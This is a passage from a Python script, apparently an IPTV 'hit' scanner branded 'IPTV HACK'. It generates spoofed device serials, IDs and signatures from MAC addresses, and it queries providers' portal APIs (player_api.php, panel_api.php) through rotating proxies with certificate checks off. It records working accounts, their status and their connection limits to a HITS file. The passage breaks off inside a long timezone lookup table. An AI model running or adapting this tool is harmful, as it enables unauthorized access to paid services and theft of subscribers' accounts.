  2 = 𝐏𝐫𝐨𝐣𝐞𝐜𝐭 𝐄𝐥𝐞𝐜𝐭𝐫𝐨𝐧 𝐒𝐩𝐞𝐞𝐝-𝐗 𝐛𝐲 𝐉𝐨𝐬𝐢𝐞𝐥 𝐉𝐞𝐟𝐟𝐞𝐫𝐬𝐨𝐧
  3 = PAULO
  4 = "PRL"
  5 = ✩PAPY GOGO✩
\n\033[1;38;5;2m
Caso nenhuma informação seja fornecida, a opção ᴘʀᴏᴊᴇᴄᴛ ᴇʟᴇᴄᴛʀᴏɴ sᴘᴇᴇᴅ-x
será registrada automaticamente no arquivo de HITS.
\n\033[38;5;229mPressione ENTER para confirmar, ou insira seu nome ou selecione uma opção: \033[1;38;5;215m""").strip()
nickn = options.get(nickn, nickn)
if nickn in options.values():
    print(f"\nVocê escolheu: {nickn}")
else:
    print(f"\nVocê digitou: {nickn}")
time.sleep(3)
hitsay=0
say=1
def device(mac, modo="completo"):
	mac = mac.upper()
	SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
	SNENC = SN.upper()
	SNCUT = SNENC[:13]
	DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
	DEVENC = DEV.upper()
	DEV1 = hashlib.sha256(SNCUT.encode('utf-8')).hexdigest()
	DEVENC1 = DEV1.upper()
	SG = SNCUT + '+' + mac
	SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
	SINGENC = SING.upper()
	sifre="""
╔══ 🥷⚜️🅴🄽🄲🅁🅴🅿🅃✩🅸🄽🄵🄾⚜️🥷
├㋡ ➤ Serial Completo ☞ """ +SN+"""
├㋡ ➤ Número do Serial ☞ """ +SNCUT+"""
├㋡ ➤ ID do Dispositivo 1 ☞ """ +DEVENC+"""
├㋡ ➤ ID do Dispositivo 2 ☞ """ +DEVENC1+"""
├㋡ ➤ Assinatura ☞ """ +SINGENC+"""
╚════════☆🅸🅿🆃🆅 🅷🅰🅲🅺☆ """
	sifremini="""
╔══ 🥷⚜️🅴🄽🄲🅁🅈🄿🅃✩🅸🄽🄵🄾⚜️🥷
├㋡ ➤ sᴇʀɪᴀʟ ɴᴜᴍʙᴇʀ ☞ """ +SNCUT+"""
├㋡ ➤ ɪᴅ1 ☞ """ +DEVENC+"""
├㋡ ➤ ɪᴅ2 ☞ """ +DEVENC1+"""
├㋡ ➤ sɪɢɴᴀᴛᴜʀᴇ ☞ """ +SINGENC+"""
╚════════☆🅸🅿🆃🆅 🅷🅰🅲🅺☆ """
	return sifre if modo == "completo" else sifremini
def list(listlink,mac,token,livel):
	kategori=""
	country_record = ' Afghanistan | Albania | Algeria | Andorra | Angola | Antigua and Barbuda | Argentina | Armenia | Australia | Austria | Azerbaijan | Bahamas | Bahrain | Bangladesh | Barbados | Belarus | Belgium | Belize | Benin | Bhutan | Bolivia | Bosnia and Herzegovina | Botswana | Brazil | Brunei | Bulgaria | Burkina Faso | Burundi | Cabo Verde | Cambodia | Cameroon | Canada | Central African Republic | Chad | Chile | China | Colombia | Comoros | Congo | Costa Rica | Côte d’Ivoire | Croatia | Cuba | Cyprus | Czech Republic | Denmark | Djibouti | Dominica | Dominican Republic | East Timor | Ecuador | Egypt | El Salvador | Equatorial Guinea | Eritrea | Estonia | Eswatini | Ethiopia | Fiji | Finland | France | Gabon | Gambia | Georgia | Germany | Ghana | Greece | Grenada | Guatemala | Guinea | Guinea-Bissau | Guyana | Haiti | Honduras | Hungary | Iceland | India | Indonesia | Iran | Iraq | Ireland | Israel | Italy | Jamaica | Japan | Jordan | Kazakhstan | Kenya | Kiribati | North Korea | South Korea | Kosovo | Kuwait | Kyrgyzstan | Laos | Latvia | Lebanon | Lesotho | Liberia | Libya | Liechtenstein | Lithuania | Luxembourg | Madagascar | Malawi | Malaysia | Maldives | Mali | Malta | Marshall Islands | Mauritania | Mauritius | Mexico | Federated States of Micronesia | Moldova | Monaco | Mongolia | Montenegro | Morocco | Mozambique | Burma | Myanmar | Namibia | Nauru | Nepal | Netherlands | New Zealand | Nicaragua | Niger | Nigeria | North Macedonia | Norway | Oman | Pakistan | Palau | Panama | Papua New Guinea | Paraguay | Peru | Philippines | Poland | Portugal | Qatar | Romania | Russia | Rwanda | Saint Kitts and Nevis | Saint Lucia | Saint Vincent and the Grenadines | Samoa | San Marino | Sao Tome and Principe | Saudi Arabia | Senegal | Serbia | Seychelles | Sierra Leone | Singapore | Slovakia | Slovenia | Solomon Islands | Somalia | South Africa | Spain | Sri Lanka | Sudan | South Sudan | Suriname | Sweden | Switzerland | Syria | Taiwan | Tajikistan | Tanzania | Thailand | Togo | Tonga | Trinidad and Tobago | Tunisia | Turkey | Turkmenistan | Tuvalu | Uganda | Ukraine | United Arab Emirates | United Kingdom | United States | Uruguay | Uzbekistan | Vanuatu | Vatican City | Venezuela | Vietnam | Yemen | Zambia | Zimbabwe | Abkhazian | Afar | Afrikaans | Akan | Albanian | Amharic | Arabic | Aragonese | Armenian | Assamese | Avaric | Avestan | Aymara | Azerbaijani | Bambara | Bashkir | Basque | Belarusian | Bengali | Bislama | Bosnian | Breton | Bulgarian | Burmese | Canadien | Catalan | Chamorro | Chechen | Chichewa | Chinese | Slavonic | Chuvash | Cornish | Corsican | Cree | Croatian | Czech | Danish | Divehi | Dhivehi | Maldivian | Dutch | Dzongkha | English | Esperanto | Estonian | Ewe | Faroese | Fijian | Finnish | French | Western Frisian | Fulah | Gaelic | Galician | Ganda | Georgian | German | Greek | KalaallisutGreenlandic | Guarani | Gujarati | Haitian | Hausa | Hebrew | Herero | Hindi | Hiri Motu | Hungarian | Icelandic | Ido | Igbo | Indonesian | Interlingua | Interlingue | Inuktitut | Inupiaq | Irish | Italian | Japanese | Javanese | Kannada | Kanuri | Kashmiri | Kazakh | Khmer | Cambodian | Kikuyu | Gikuyu | Kinyarwanda | Kirghiz | Kyrgyz | Komi | Kongo | Korean | Kuanyama | Kwanyama | Kurdish | Lao | Latin | Latvian | Limburgan | Limburger | Limburgish | Lingala | Lithuanian | Luba-Katanga | Luxembourgish | Letzeburgesch | Macedonian | Malagasy | Malay | Malayalam | Maltese | Manx | Maori | Māori | Marathi | Marāṭhī | Marshallese | Mongolian | Nauru | Nauruan | Navajo | Navaho | North Ndebele | Northern Ndebele | South Ndebele | Southern Ndebele | Ndonga | Nepali | Norwegian | Sichuan Yi | Nuosu | Occitan | Ojibwa | Oriya | Oromo | Ossetian | Ossetic | Pali | Pashto | Pushto | Persian | Farsi | Polish | Portuguese | Punjabi | Panjabi | Quechua | Romanian | Moldavian | Moldovan | Romansh | Rundi | Russian | Northern Sami | Samoan | Sango | Sanskrit | Sardinian | Serbian | Shona | Sindhi | Sinhala | Sinhalese | Slovak | Slovenian | Somali | Southern Sotho | Spanish | Castilian | Sundanese | Swahili | Swati | Swedish | Tagalog | Filipino | Tahitian | Tajik | Tamil | Tatar | Telugu | Thai | Tibetan | Tigrinya | Tonga | Tongan | Tsonga | Tswana | Turkish | Turkmen | Twi | Uighur | Uyghur | Ukrainian | Urdu | Uzbek | Venda | Vietnamese | Volapük | Walloon | Welsh | Wolof | Xhosa | Yiddish | Yoruba | Zhuang | Chuang | Zulu | canada | usa | uk | germany | vietnam | africa | india | latino | colombia | argentina | portugal | brazil | chile | peru | australia | italy | greek | caribbean | philippines | france | us/ca | tajikistan | uzbekistan | venezuela | spain | salvador | guatemala | honduras | panama | haiti | mexico | latvia | armenia | estonia | belarus | brasil | Algeria | malta | puerto rico | afghanistan | bulgaria | lithunia | ukraine | russia | indonesia | sri lanka | hongkong | south korea | Afghan | Sudan | Libya | china | malesyia | malaysia | kurdish | taiwan | azerbejian | Kannada | Persian | azerbaijan | arabic | pakistan | georgia | kazachstan | Kazakhstan | australia | Bangla/Bengali | Urdu | Palestine | Telugu | Malayalam | Marathi | Oriya | Gujarat | Somali | thailand | iran | iraq | Sinhala | Hindi | Tamil | israel | Punjabi | switzerland | turkey | Egypt | finland | denmark | sweden | norway | hungary | czech republic | belgium | grecce | romania | netherland | spain | poland | albania | ireland | latin | netherlands | czech | belize | dominican | Lebanon | Gulf | Nepali | argentina | congo | Saudia Arabia | cameroon | kenya | ethiopia | jordan | kuwait | uae | Slovenia | cambodia | Syria | indonesia | bahrain | austria | canadian | filipino | Tunisia | Morocco | english | African | Australian | Brazilian | Danish | Dutch/Belgian | French | German | Indian | Italian | Nordic | Polish | Portuguese | Romanian | Spanish | Swedish | Canadian | Irish | turkish | chinese | Ukrainian | costa rica | dominicana | uruguay | paraguay | nicaragua | ecuador | cuba | united kingdom | united states | espanha | italia | swiss | scandinavia | balkan | can | eng | portugal/brazil | macedonia | espania | turkiye | rep dominicana | espana | deutchland | letzebuerg | Nederland | turquia | românia | ca | us | de | vn | za | co | ar | pt | br | cl | pe | au | it | gr | ph | fr | tj | uz | ve | es | sv | gt | hn | pa | ht | mx | lv | id | am | ee | by | mt | pr | af | bg | lt | ua | ru | id | lk | hk | kr | cn | my | tw | az | pk | ge | kz | au | th | ir | iq | il | ch | tr | fi | dk | se | no | hu | be | gr | ro | cd | cm | ke | et | jo | kw | kh | id | bh | at | ca | uy | py | ni | ec | cu | us | mk |dz | sd | ly | tn '
	veri=""
	while True:
		try:
			res = ses.get(listlink,headers=hea2(mac,token),proxies=proxygetir(),timeout=(3), verify=False)
			veri=str(res.text)
			break
		except:pass
	if veri.count('title":"')>0:
			for i in veri.split('title":"'):
				try:
					kanal=""
					kanal= str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\\/','/')
				except:pass
				kategori += kanal + livel
				kategori = kategori.replace("{", "").replace("•", "").replace("|", "").replace(" • |", "").replace("{• |", "")
	list=kategori
	return list
def m3ugoruntu(cid,user,pas,plink):
    durum="⛔ 𝗢𝗙𝗙𝗟𝗜𝗡𝗘 🍌"
    try:
            url=http+"://"+plink+'/live/'+str(user)+'/'+str(pas)+'/'+str(cid)+'.ts'
            res = ses.get(url,  headers=hea3(), timeout=(2,5), allow_redirects=False,stream=True)
            if res.status_code==302:
                durum="✅ 𝗢𝗡𝗟𝗜𝗡𝗘 🍀"
    except:
            durum="⛔ 𝗢𝗙𝗙𝗟𝗜𝗡𝗘 🍌"
    return durum
hit=0
def m3uapi(playerlink,mac,token,trh):
	mt=""
	bag=0
	veri=""
	bad=0
	while True:
		try:
			res = ses.get(playerlink, headers=hea2(mac,token), proxies=proxygetir(),timeout=(3), verify=False)
			veri=str(res.text)
			break
		except:
			if not proxi =="1":
				bad=bad+1
				if bad==3:
					break
	if veri=="" or '404' in veri:
		bad=0
		while True:
			try:
				playerlink=playerlink.replace('player_api.php','panel_api.php')
				res = ses.get(playerlink, headers=hea2(mac,token), proxies=proxygetir(),timeout=(3), verify=False)
				veri=str(res.text)
				break
			except:
				if not proxi =="1":
					bad=bad+1
					if bad==3:
						break
	acon=""
	timezone=""
	message=""
	if 'active_cons' in veri:
				acon = veri.split('active_cons":')[1].split(',')[0].replace('"', '')
				mcon = veri.split('max_connections":')[1].split(',')[0].replace('"', '')
				status = str(veri.split('status":')[1].split(',')[0]).replace('"', '')
				status = '𝐀𝐂𝐓𝐈𝐕𝐄🔋'
				status = f"├㋡ ➤ 𝕊𝚃𝙰𝚃𝚄𝚂 ☞ {status}"
				try:
					timezone = "├㋡ ➤ 𝕋𝙸𝙼𝙴 ℤ𝙾𝙽𝙴 ☞ " + str(veri.split('timezone":')[1].split(',')[0]).replace('"', '').replace("\/","/")
					replacement_dict = {'Africa/Windhoek': '🇳🇦Windhoek[NA]', 'Africa/Abidjan': '🇨🇮Abidjan[CI]', 'Africa/Accra': '🇬🇭Accra[GH]', 'Africa/Addis_Ababa': '🇪🇹Addis Ababa[ET]', 'Africa/Algiers': '🇩🇿Algiers[DZ]', 'Africa/Asmara': '🇪🇷Asmara[ER]', 'Africa/Asmera': '🇪🇷Asmera[ER]', 'Africa/Bamako': '🇲🇱Bamako[ML]', 'Africa/Bangui': '🇨🇫Bangui[CF]', 'Africa/Banjul': '🇬🇲Banjul[GM]', 'Africa/Bissau': '🇬🇼Bissau[GW]', 'Africa/Blantyre': '🇲🇼Blantyre[MW]', 'Africa/Brazzaville': '🇨🇬Brazzaville[CG]', 'Africa/Bujumbura': '🇧🇮Bujumbura[BI]', 'Africa/Cairo': '🇪🇬CairoPT[EG]', 'Africa/Casablanca': '🇲🇦Casablanca[MA]', 'Africa/Ceuta': '🇪🇸Ceuta[ES]', 'Africa/Conakry': '🇬🇳Conakry[GN]', 'Africa/Dakar': '🇸🇳Dakar[SN]', 'Africa/Dar_es_Salaam': '🇹🇿Dar es Salaam[TZ]', 'Africa/Djibouti': '🇩🇯Djibouti[DJ]', 'Africa/Douala': '🇨🇲Douala[CM]', 'Africa/El_Aaiun': '🇪🇭El Aaiun[EH]', 'Africa/Freetown': '🇸🇱Freetown[SL]', 'Africa/Gaborone': '🇧🇼Gaborone[BW]', 'Africa/Harare': '🇿🇼Harare[ZW]', 'Africa/Johannesburg': '🇿🇦Johannesburg[ZA]', 'Africa/Juba': '🇸🇸Juba[SS]', 'Africa/Kampala': '🇺🇬Kampala[UG]', 'Africa/Khartoum': '🇸🇩Khartoum[SD]', 'Africa/Kigali': '🇷🇼Kigali[RW]', 'Africa/Kinshasa': '🇨🇩Kinshasa[CD]', 'Africa/Lagos': '🇳🇬Lagos[NG]', 'Africa/Libreville': '🇬🇦Libreville[GA]', 'Africa/Lome': '🇹🇬Lomé[TG]', 'Africa/Luanda': '🇦🇴Luanda[AO]', 'Africa/Lubumbashi': '🇨🇩Lubumbashi[CD]', 'Africa/Lusaka': '🇿🇲Lusaka[ZM]', 'Africa/Malabo': '🇬🇶Malabo[GQ]', 'Africa/Maputo': '🇲🇿Maputo[MZ]', 'Africa/Maseru': '🇱🇸Maseru[LS]', 'Africa/Mbabane': '🇸🇿Mbabane[SZ]', 'Africa/Mogadishu': '🇸🇴Mogadishu[SO]', 'Africa/Monrovia': '🇱🇷Monrovia[LR]', 'Africa/Nairobi': '🇰🇪Nairobi[KE]', 'Africa/Ndjamena': '🇹🇩Ndjamena[TD]', 'Africa/Niamey': '🇳🇪Niamey[NE]', 'Africa/Nouakchott': '🇲🇷Nouakchott[MR]', 'Africa/Ouagadougou': '🇧🇫Ouagadougou[BF]', 'Africa/Porto-Novo': '🇧🇯Porto-Novo[BJ]', 'Africa/Sao_Tome': '🇸🇹São Tomé[ST]', 'Africa/Timbuktu': '🇲🇱Timbuktu[ML]', 'Africa/Tripoli': '🇱🇾Tripoli[LY]', 'Africa/Tunis': '🇹🇳Tunis[TN]', 'America/Adak': '🇺🇸Adak[US]', 'America/Anchorage': '🇺🇸Anchorage[US]', 'America/Anguilla': '🇦🇮Anguilla[AI]', 'America/Antigua': '🇦🇬Antigua[AG]', 'America/Araguaina': '🇧🇷Araguaína[BR]', 'America/Argentina/Buenos_Aires': '🇦🇷Buenos Aires[AR]', 'America/Argentina/Catamarca': '🇦🇷Catamarca[AR]', 'America/Argentina/ComodRivadavia': '🇦🇷ComodRivadavia[AR]', 'America/Argentina/Cordoba': '🇦🇷Córdoba[AR]', 'America/Argentina/Jujuy': '🇦🇷Jujuy[AR]', 'America/Argentina/La_Rioja': '🇦🇷La Rioja[AR]', 'America/Argentina/Mendoza': '🇦🇷Mendoza[AR]', 'America/Argentina/Rio_Gallegos': '🇦🇷Río Gallegos[AR]', 'America/Argentina/Salta': '🇦🇷Salta[AR]', 'America/Argentina/San_Juan': '🇦🇷San Juan[AR]', 'America/Argentina/San_Luis': '🇦🇷San Luis[AR]', 'America/Argentina/Tucuman': '🇦🇷Tucumán[AR]', 'America/Argentina/Ushuaia': '🇦🇷Ushuaia[AR]', 'America/Aruba': '🇦🇼Aruba[AW]', 'America/Asuncion': '🇵🇾Asunción[PY]', 'America/Atikokan': '🇨🇦Atikokan[CA]', 'America/Atka': '🇺🇸Atka[US]', 'America/Bahia': '🇧🇷Bahia[BR]', 'America/Bahia_Banderas': '🇲🇽Bahía Banderas[MX]', 'America/Barbados': '🇧🇧Barbados[BB]', 'America/Belem': '🇧🇷Belém[BR]', 'America/Belize': '🇧🇿Belize[BZ]', 'America/Blanc-Sablon': '🇨🇦Blanc-Sablon[CA]', 'America/Boa_Vista': '🇧🇷Boa Vista[BR]', 'America/Bogota': '🇨🇴Bogotá[CO]', 'America/Boise': '🇺🇸Boise[US]', 'America/Buenos_Aires': '🇦🇷Buenos Aires[AR]', 'America/Cambridge_Bay': '🇨🇦Cambridge Bay[CA]', 'America/Campo_Grande': '🇧🇷Campo Grande[BR]', 'America/Cancun': '🇲🇽Cancún[MX]', 'America/Caracas': '🇻🇪Caracas[VE]', 'America/Catamarca': '🇦🇷Catamarca[AR]', 'America/Cayenne': '🇬🇫Cayenne[GF]', 'America/Cayman': '🇰🇾Cayman[KY]', 'America/Chicago': '🇺🇸Chicago[US]', 'America/Chihuahua': '🇲🇽Chihuahua[MX]', 'America/Ciudad_Juarez': '🇲🇽Ciudad Juárez[MX]', 'America/Coral_Harbour': '🇨🇦Coral Harbour[CA]', 'America/Cordoba': '🇦🇷Córdoba[AR]', 'America/Costa_Rica': '🇨🇷Costa Rica[CR]', 'America/Creston': '🇨🇦Creston[CA]', 'America/Cuiaba': '🇧🇷Cuiabá[BR]', 'America/Curacao': '🇨🇼Curaçao[CW]', 'America/Danmarkshavn': '🇬🇱Danmarkshavn[GL]', 'America/Dawson': '🇨🇦Dawson[CA]', 'America/Dawson_Creek': '🇨🇦Dawson Creek[CA]', 'America/Denver': '🇺🇸Denver[US]', 'America/Detroit': '🇺🇸Detroit[US]', 'America/Dominica': '🇩🇲Dominica[DM]', 'America/Edmonton': '🇨🇦Edmonton[CA]', 'America/Eirunepe': '🇧🇷Eirunepé[BR]', 'America/El_Salvador': '🇸🇻El Salvador[SV]', 'America/Ensenada': '🇲🇽Ensenada[MX]', 'America/Fort_Nelson': '🇨🇦Fort Nelson[CA]', 'America/Fort_Wayne': '🇺🇸Fort Wayne[US]', 'America/Fortaleza': '🇧🇷Fortaleza[BR]', 'America/Glace_Bay': '🇨🇦Glace Bay[CA]', 'America/Godthab': '🇬🇱Godthåb[GL]', 'America/Goose_Bay': '🇨🇦Goose Bay[CA]', 'America/Grand_Turk': '🇹🇨Grand Turk[TC]', 'America/Grenada': '🇬🇩Grenada[GD]', 'America/Guadeloupe': '🇬🇵Guadeloupe[GP]', 'America/Guatemala': '🇬🇹Guatemala[GT]', 'America/Guayaquil': '🇪🇨Guayaquil[EC]', 'America/Guyana': '🇬🇾Guyana[GY]', 'America/Halifax': '🇨🇦Halifax[CA]', 'America/Havana': '🇨🇺Havana[CU]', 'America/Hermosillo': '🇲🇽Hermosillo[MX]', 'America/Indiana/Indianapolis': '🇺🇸Indianapolis[US]', 'America/Indiana/Knox': '🇺🇸Knox[US]', 'America/Indiana/Marengo': '🇺🇸Marengo[US]', 'America/Indiana/Petersburg': '🇺🇸Petersburg[US]', 'America/Indiana/Tell_City': '🇺🇸Tell City[US]', 'America/Indiana/Vevay': '🇺🇸Vevay[US]', 'America/Indiana/Vincennes': '🇺🇸Vincennes[US]', 'America/Indiana/Winamac': '🇺🇸Winamac[US]', 'America/Indianapolis': '🇺🇸Indianapolis[US]', 'America/Inuvik': '🇨🇦Inuvik[CA]', 'America/Iqaluit': '🇨🇦Iqaluit[CA]', 'America/Jamaica': '🇯🇲Jamaica[JM]', 'America/Jujuy': '🇦🇷Jujuy[AR]', 'America/Juneau': '🇺🇸Juneau[US]', 'America/Kentucky/Louisville': '🇺🇸Louisville[US]', 'America/Kentucky/Monticello': '🇺🇸Monticello[US]', 'America/Knox_IN': '🇺🇸Knox[US]', 'America/Kralendijk': '🇧🇶Kralendijk[BQ]', 'America/La_Paz': '🇧🇴La Paz[BO]', 'America/Lima': '🇵🇪Lima[PE]', 'America/Los_Angeles': '🇺🇸Los Angeles[US]', 'America/Louisville': '🇺🇸Louisville[US]', 'America/Lower_Princes': '🇸🇽Lower Princes[SX]', 'America/Maceio': '🇧🇷Maceió[BR]', 'America/Managua': '🇳🇮Managua[NI]', 'America/Manaus': '🇧🇷Manaus[BR]', 'America/Marigot': '🇲🇫Marigot[MF]', 'America/Martinique': '🇲🇶Martinique[MQ]', 'America/Matamoros': '🇲🇽Matamoros[MX]', 'America/Mazatlan': '🇲🇽Mazatlán[MX]', 'America/Mendoza': '🇦🇷Mendoza[AR]', 'America/Menominee': '🇺🇸Menominee[US]', 'America/Merida': '🇲🇽Mérida[MX]', 'America/Metlakatla': '🇺🇸Metlakatla[US]', 'America/Mexico_City': '🇲🇽Mexico City[MX]', 'America/Miquelon': '🇵🇲Miquelon[PM]', 'America/Moncton': '🇨🇦Moncton[CA]', 'America/Monterrey': '🇲🇽Monterrey[MX]', 'America/Montevideo': '🇺🇾Montevideo[UY]', 'America/Montreal': '🇨🇦Montreal[CA]', 'America/Montserrat': '🇲🇸Montserrat[MS]', 'America/Nassau': '🇧🇸Nassau[BS]', 'America/New_York': '🇺🇸New York[US]', 'America/Nipigon': '🇨🇦Nipigon[CA]', 'America/Nome': '🇺🇸Nome[US]', 'America/Noronha': '🇧🇷Fernando de Noronha[BR]', 'America/North_Dakota/Beulah': '🇺🇸North Dakota[US]', 'America/North_Dakota/Center': '🇺🇸North Dakota[US]', 'America/North_Dakota/New_Salem': '🇺🇸North Dakota[US]', 'America/Nuuk': '🇬🇱Nuuk[GL]', 'America/Ojinaga': '🇲🇽Ojinaga[MX]', 'America/Panama': '🇵🇦Panama[PA]', 'America/Pangnirtung': '🇨🇦Pangnirtung[CA]', 'America/Paramaribo': '🇸🇷Paramaribo[SR]', 'America/Phoenix': '🇺🇸Phoenix[US]', 'America/Port-au-Prince': '🇭🇹Port-au-Prince[HT]', 'America/Port_of_Spain': '🇹🇹Port of Spain[TT]', 'America/Porto_Acre': '🇧🇷Porto Acre[BR]', 'America/Porto_Velho': '🇧🇷Porto Velho[BR]', 'America/Puerto_Rico': '🇵🇷San Juan[PR]', 'America/Punta_Arenas': '🇨🇱Punta Arenas[CL]', 'America/Rainy_River': '🇨🇦Rainy River[CA]', 'America/Rankin_Inlet': '🇨🇦Rankin Inlet[CA]', 'America/Recife': '🇧🇷Recife[BR]', 'America/Regina': '🇨🇦Regina[CA]', 'America/Resolute': '🇨🇦Resolute[CA]', 'America/Rio_Branco': '🇧🇷Rio Branco[BR]', 'America/Rosario': '🇦🇷Rosario[AR]', 'America/Santa_Isabel': '🇲🇽Santa Isabel[MX]', 'America/Santarem': '🇧🇷Santarém[BR]', 'America/Santiago': '🇨🇱Santiago[CL]', 'America/Santo_Domingo': '🇩🇴Santo Domingo[DO]', 'America/Sao_Paulo': '🇧🇷São Paulo[BR]', 'America/Scoresbysund': '🇬🇱Scoresbysund[GL]', 'America/Shiprock': '🇺🇸Shiprock[US]', 'America/Sitka': '🇺🇸Sitka[US]', 'America/St_Barthelemy': '🇧🇱St. Barthélemy[BL]', 'America/St_Johns': '🇨🇦St. John\'s[CA]', 'America/St_Kitts': '🇰🇳St. Kitts[KN]', 'America/St_Lucia': '🇱🇨St. Lucia[LC]', 'America/St_Thomas': '🇻🇮St. Thomas[VI]', 'America/St_Vincent': '🇻🇨St. Vincent[VC]', 'America/Swift_Current': '🇨🇦Swift Current[CA]', 'America/Tegucigalpa': '🇭🇳Tegucigalpa[HN]', 'America/Thule': '🇬🇱Thule[GL]', 'America/Thunder_Bay': '🇨🇦Thunder Bay[CA]', 'America/Tijuana': '🇲🇽Tijuana[MX]', 'America/Toronto': '🇨🇦Toronto[CA]', 'America/Tortola': '🇻🇬Tortola[VG]', 'America/Vancouver': '🇨🇦Vancouver[CA]', 'America/Virgin': '🇻🇮Virgin Islands[VI]', 'America/Whitehorse': '🇨🇦Whitehorse[CA]', 'America/Winnipeg': '🇨🇦Winnipeg[CA]', 'America/Yakutat': '🇺🇸Yakutat[US]', 'America/Yellowknife': '🇨🇦Yellowknife[CA]', 'Antarctica/Casey': '🇦🇶Casey[AQ]', 'Antarctica/Davis': '🇦🇶Davis[AQ]', 'Antarctica/DumontDUrville': '🇦🇶Dumont d\'Urville[AQ]', 'Antarctica/Macquarie': '🇦🇶Macquarie Island[AQ]', 'Antarctica/Mawson': '🇦🇶Mawson[AQ]', 'Antarctica/McMurdo': '🇳🇿McMurdo[NZ]', 'Antarctica/Palmer': '🇦🇶Palmer[AQ]', 'Antarctica/Rothera': '🇦🇶Rothera[AQ]', 'Antarctica/South_Pole': '🇦🇶South Pole[AQ]', 'Antarctica/Syowa': '🇦🇶Syowa[AQ]', 'Antarctica/Troll': '🇦🇶Troll[AQ]', 'Antarctica/Vostok': '🇦🇶Vostok[AQ]', 'Arctic/Longyearbyen': '🇸🇯Longyearbyen[SJ]', 'Asia/Aden': '🇾🇪Aden[YE]', 'Asia/Almaty': '🇰🇿Almaty[KZ]', 'Asia/Amman': '🇯🇴Amman[JO]', 'Asia/Anadyr': '🇷🇺Anadyr[RU]', 'Asia/Aqtau': '🇰🇿Aqtau[KZ]', 'Asia/Aqtobe': '🇰🇿Aqtobe[KZ]', 'Asia/Ashgabat': '🇹🇲Ashgabat[TM]', 'Asia/Ashkhabad': '🇹🇲Ashkhabad[TM]', 'Asia/Atyrau': '🇰🇿Atyrau[KZ]', 'Asia/Baghdad': '🇮🇶Baghdad[IQ]', 'Asia/Bahrain': '🇧🇭Bahrain[BH]', 'Asia/Baku': '🇦🇿Baku[AZ]', 'Asia/Bangkok': '🇹🇭Bangkok[TH]', 'Asia/Barnaul': '🇷🇺Barnaul[RU]', 'Asia/Beirut': '🇱🇧Beirut[LB]', 'Asia/Bishkek': '🇰🇬Bishkek[KG]', 'Asia/Brunei': '🇧🇳Brunei[BN]', 'Asia/Calcutta': '🇮🇳Calcutta[IN]', 'Asia/Chita': '🇷🇺Chita[RU]', 'Asia/Choibalsan': '🇲🇳Choibalsan[MN]', 'Asia/Chongqing': '🇨🇳Chongqing[CN]', 'Asia/Chungking': '🇨🇳Chungking[CN]', 'Asia/Colombo': '🇱🇰Colombo[LK]', 'Asia/Dacca': '🇧🇩Dacca[BD]', 'Asia/Damascus': '🇸🇾Damascus[SY]', 'Asia/Dhaka': '🇧🇩Dhaka[BD]', 'Asia/Dili': '🇹🇱Dili[TL]', 'Asia/Dubai': '🇦🇪Dubai[AE]', 'Asia/Dushanbe': '🇹🇯Dushanbe[TJ]', 'Asia/Famagusta': '🇨🇾Famagusta[CY]', 'Asia/Gaza': '🇵🇸Gaza[PS]', 'Asia/Harbin': '🇨🇳Harbin[CN]', 'Asia/Hebron': '🇵🇸Hebron[PS]', 'Asia/Ho_Chi_Minh': '🇻🇳Ho Chi Minh[VN]', 'Asia/Hong_Kong': '🇭🇰Hong Kong[HK]', 'Asia/Hovd': '🇲🇳Hovd[MN]', 'Asia/Irkutsk': '🇷🇺Irkutsk[RU]', 'Asia/Istanbul': '🇹🇷Istanbul[TR]', 'Asia/Jakarta': '🇮🇩Jakarta[ID]', 'Asia/Jayapura': '🇮🇩Jayapura[ID]', 'Asia/Jerusalem': '🇮🇱Jerusalem[IL]', 'Asia/Kabul': '🇦🇫Kabul[AF]', 'Asia/Kamchatka': '🇷🇺Kamchatka[RU]', 'Asia/Karachi': '🇵🇰Karachi[PK]', 'Asia/Kashgar': '🇨🇳Kashgar[CN]', 'Asia/Kathmandu': '🇳🇵Kathmandu[NP]', 'Asia/Katmandu': '🇳🇵Katmandu[NP]', 'Asia/Khandyga': '🇷🇺Khandyga[RU]', 'Asia/Kolkata': '🇮🇳Kolkata[IN]', 'Asia/Krasnoyarsk': '🇷🇺Krasnoyarsk[RU]', 'Asia/Kuala_Lumpur': '🇲🇾Kuala Lumpur[MY]', 'Asia/Kuching': '🇲🇾Kuching[MY]', 'Asia/Kuwait': '🇰🇼Kuwait[KW]', 'Asia/Macao': '🇲🇴Macao[MO]', 'Asia/Macau': '🇲🇴Macau[MO]', 'Asia/Magadan': '🇷🇺Magadan[RU]', 'Asia/Makassar': '🇮🇩Makassar[ID]', 'Asia/Manila': '🇵🇭Manila[PH]', 'Asia/Muscat': '🇴🇲Muscat[OM]', 'Asia/Nicosia': '🇨🇾Nicosia[CY]', 'Asia/Novokuznetsk': '🇷🇺Novokuznetsk[RU]', 'Asia/Novosibirsk': '🇷🇺Novosibirsk[RU]', 'Asia/Omsk': '🇷🇺Omsk[RU]', 'Asia/Oral': '🇰🇿Oral[KZ]', 'Asia/Phnom_Penh': '🇰🇭Phnom Penh[KH]', 'Asia/Pontianak': '🇮🇩Pontianak[ID]', 'Asia/Pyongyang': '🇰🇵Pyongyang[KP]', 'Asia/Qatar': '🇶🇦Qatar[QA]', 'Asia/Qostanay': '🇰🇿Qostanay[KZ]', 'Asia/Qyzylorda': '🇰🇿Qyzylorda[KZ]', 'Asia/Rangoon': '🇲🇲Rangoon[MM]', 'Asia/Riyadh': '🇸🇦Riyadh[SA]', 'Asia/Saigon': '🇻🇳Saigon[VN]', 'Asia/Sakhalin': '🇷🇺Sakhalin[RU]', 'Asia/Samarkand': '🇺🇿Samarkand[UZ]', 'Asia/Seoul': '🇰🇷Seoul[KR]', 'Asia/Shanghai': '🇨🇳Shanghai[CN]', 'Asia/Singapore': '🇸🇬Singapore[SG]', 'Asia/Srednekolymsk': '🇷🇺Srednekolymsk[RU]', 'Asia/Taipei': '🇹🇼Taipei[TW]', 'Asia/Tashkent': '🇺🇿Tashkent[UZ]', 'Asia/Tbilisi': '🇬🇪Tbilisi[GE]', 'Asia/Tehran': '🇮🇷Tehran[IR]', 'Asia/Tel_Aviv': '🇮🇱Tel Aviv[IL]', 'Asia/Thimbu': '🇧🇹Thimbu[BT]', 'Asia/Thimphu': '🇧🇹Thimphu[BT]', 'Asia/Tokyo': '🇯🇵Tokyo[JP]', 'Asia/Tomsk': 